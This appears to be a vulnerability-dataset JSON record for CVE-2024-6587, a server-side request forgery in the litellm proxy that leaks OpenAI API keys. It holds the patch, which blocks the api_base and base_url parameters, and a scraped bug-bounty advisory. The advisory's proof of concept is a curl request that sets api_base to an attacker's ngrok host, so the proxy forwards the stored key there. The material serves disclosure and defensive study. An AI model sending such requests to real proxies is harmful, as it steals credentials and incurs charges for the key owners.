{
    "CVE-2024-6587": {
        "published_date": "2024-09-13T15:59:53.557Z",
        "patch_commits": [
            {
                "url": "https://github.com/berriai/litellm/commit/ba1912afd1b19e38d3704bb156adf887f91ae1e0",
                "content": "add check for is_request_body_safe\n\nFilename: litellm/proxy/auth/auth_checks.py:\n```\n@@ -40,6 +40,22 @@\nall_routes = LiteLLMRoutes.openai_routes.value + LiteLLMRoutes.management_routes.value\n \n \n+def is_request_body_safe(request_body: dict) -> bool:\n+    \"\"\"\n+    Check if the request body is safe.\n+\n+    A malicious user can set the ﻿api_base to their own domain and invoke POST /chat/completions to intercept and steal the OpenAI API key.\n+    Relevant issue: https://huntr.com/bounties/4001e1a2-7b7a-4776-a3ae-e6692ec3d997\n+    \"\"\"\n+    banned_params = [\"api_base\", \"base_url\"]\n+\n+    for param in banned_params:\n+        if param in request_body:\n+            raise ValueError(f\"BadRequest: {param} is not allowed in request body\")\n+\n+    return True\n+\n+\n def common_checks(\n     request_body: dict,\n     team_object: Optional[LiteLLM_TeamTable],\n\n@@ -60,6 +76,7 @@\ndef common_checks(\n     6. [OPTIONAL] If 'enforce_end_user' enabled - did developer pass in 'user' param for openai endpoints\n     7. [OPTIONAL] If 'litellm.max_budget' is set (>0), is proxy under budget\n     8. [OPTIONAL] If guardrails modified - is request allowed to change this\n+    9. Check if request body is safe\n     \"\"\"\n     _model = request_body.get(\"model\", None)\n     if team_object is not None and team_object.blocked is True:\n\n@@ -199,6 +216,7 @@\ndef common_checks(\n                     \"error\": \"Your team does not have permission to modify guardrails.\"\n                 },\n             )\n+    is_request_body_safe(request_body=request_body)\n     return True\n```"
            }
        ],
        "sw_version": "v1.44.8",
        "sw_version_wget": "https://github.com/berriai/litellm/archive/refs/tags/v1.44.8.zip",
        "description": "A Server-Side Request Forgery (SSRF) vulnerability exists in berriai/litellm version 1.38.10. This vulnerability allows users to specify the `api_base` parameter when making requests to `POST /chat/completions`, causing the application to send the request to the domain specified by `api_base`. This request includes the OpenAI API key. A malicious user can set the `api_base` to their own domain and intercept the OpenAI API key, leading to unauthorized access and potential misuse of the API key.",
        "sec_adv": [
            {
                "url": "https://huntr.com/bounties/4001e1a2-7b7a-4776-a3ae-e6692ec3d997",
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nSSRF Exposes OpenAI API Keys in berriai/litellm\nValid\nReported on May 27th 2024\nDescription\nUsers can specify the api_base parameter when making requests to POST /chat/completions.\nThe application sends the request to the domain specified by api_base.\nThis request includes the OpenAI API key.\nA malicious user can set the ﻿api_base to their own domain and invoke POST /chat/completions to intercept and steal the OpenAI API key.\nProof of Concept\n1: Start ngrok server\n$ ngrok http 10000\n2: Copy ngrok server address (e.g.: https://f000-000-00-00-00.ngrok-free.app)\n3: Start litellm proxy\n$ pip install 'litellm[proxy]'\n$ export OPENAI_API_KEY=sk-XXXXXXXXXXXX\n$ litellm --model gpt-3.5-turbo\n4: Send curl request\n$ curl -X 'POST' 'http://0.0.0.0:4000/chat/completions' \\\n  -H 'Content-Type: application/json' \\\n  --data '{\n    \"model\": \"gpt-3.5-turbo\",\n    \"messages\": [\n      {\"role\": \"user\",\"content\": \"hello\"}\n    ],\n    \"api_base\": \"https://f000-000-00-00-00.ngrok-free.app\"\n  }'\n5: Confirm ngrok log (http://locahost:4000)\nImpact\nThe SSRF vulnerability results in the leakage of the OpenAI keys that are managed by the proxy. If an attacker exploits this vulnerability, they can directly send requests to OpenAI without going through the proxy. This direct access allows them to bypass the proxy's rate limiting and budget management controls, potentially resulting in unauthorized usage and increased costs.\nIn addition, there are also common risks associated with Blind SSRF (such as scanning the internal network).\nReferences\nServer-Side Request Forgery Prevention Cheat Sheet\nWhat is SSRF (Server-side request forgery)? | Web Security Academy\nWe are processing your report and will contact theberriai/litellm team within 24 hours.a year ago\nWe have contacted a member of theberriai/litellm team and are waiting to hear backa year ago\nWe have sent a follow up to the berriai/litellm team. We will try again in 4 days.a year ago\nMarcello gave praisea year ago\nThe researcher's credibility has slightly increased as a result of the maintainer's thanks: +1\nWe have sent a second follow up to the berriai/litellm team. We will try again in 7 days.a year ago\nWe have sent a third follow up to the berriai/litellm team. We will try again in 14 days.a year ago\nWe have sent a fourth follow up to the berriai/litellm team. We will send a final notification 48 hours before report publication.a year ago\nMarcello validated this vulnerability10 months ago\nlambdasawahas been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2024-6587assigned to this report.10 months ago\nWe have sent a warning to the berriai/litellm team to inform them that this report will be published in 48 hours10 months ago\nThis vulnerability has now been published10 months ago\nIshaan Jaff\ncommented9 months ago\nMaintainer\nFixed here: https://github.com/BerriAI/litellm/pull/5418\nA berriai/litellm maintainerhas acknowledged this report9 months ago\nIshaan Jaffmarked this as fixedin 1.44.9with commitba19129 months ago\nIshaan Jaffhas been awarded the fix bounty\nDavid Manouchehri\ncommented9 months ago\nFYI this is a duplicate of a report I made privately a few days before on May 21, 2024.\nhttps://gist.github.com/Manouchehri/02083f87b3bb958935b49d2fe38a57c2\nCVE-2024-6587has now been published8 months ago\nSign in to join this conversation\nCVE\nCVE-2024-6587\n(Published)\nVulnerability Type\nCWE-918: Server-Side Request Forgery (SSRF)\nSeverity\nHigh (7.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator\nRegistry\nPypi\nAffected Version\n1.38.10\nVisibility\nPublic\nStatus\nFixed\nDisclosure Bounty\n$750\nFix Bounty\n$187.5\nFound by\nFixed by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\n© 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "The security advisory includes a detailed step-by-step proof of concept to reproduce the vulnerability."
            }
        ],
        "cwe": [
            {
                "id": "CWE-918",
                "value": "CWE-918 Server-Side Request Forgery (SSRF)"
            }
        ]
    }
}